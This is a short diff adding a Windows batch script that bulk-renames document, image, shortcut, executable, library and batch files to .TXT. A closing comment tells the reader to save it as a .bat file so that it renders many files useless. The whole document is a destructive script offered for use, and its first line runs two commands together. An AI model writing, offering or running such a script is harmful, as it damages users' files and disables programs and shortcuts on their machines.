@@ -1,0 +1,8 @@
+REN *.DOC *.TXT REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.EXE *.TXT
+REN *.DLL *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
+
+# Delete this and save as .bat . This code will change extention on a lof of files rendering them useless
